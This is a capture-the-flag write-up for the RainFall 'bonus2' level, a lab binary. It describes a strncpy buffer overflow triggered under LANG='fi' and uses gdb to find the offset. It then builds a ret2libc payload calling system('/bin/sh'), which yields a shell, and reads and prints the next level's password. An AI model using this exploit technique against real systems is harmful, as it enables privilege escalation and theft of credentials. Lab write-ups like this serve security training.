This program has a different behaviour depending on the `LANG` environment variable. There is three state :

```bash
LANG="fi"
LANG="nl"
LANG=*
```

So I first tried :

```bash
bonus2@RainFall:~$ export LANG="fi"
```

And tried to segfault the program with a buffer overflow.
First we see that the `strncpy` copy up to 40 bytes in a 10 bytes buffer. And we put a lot of bytes into the second argument :

>bonus2@RainFall:~$ gdb -q --args ./bonus2 `python -c 'print("A" * 40)'` `python -c 'print("AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH")'`
>Reading symbols from /home/user/bonus2/bonus2...(no debugging symbols found)...done.
>(gdb) run
>Starting program: /home/user/bonus2/bonus2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH
>Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH
>Program received signal SIGSEGV, Segmentation fault.
>0x46464545 in ?? ()

There is a segfault beginning at the third `E`. So as done previously, we can call `sytem("/bin/sh") from there :

>bonus2@RainFall:~$ ./bonus2 `python -c 'print("A" * 40)'` `python -c 'print("AAAABBBBCCCCDDDDEE" + "\x60\xb0\xe6\xb7" + "IDGB" + "\x58\xcc\xf8\xb7")'`
>Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEE`��IDGBX���
>$ whoami
>bonus3
>$ cat /home/user/bonus3/.pass
>71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587

```bash
su bonus3
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```

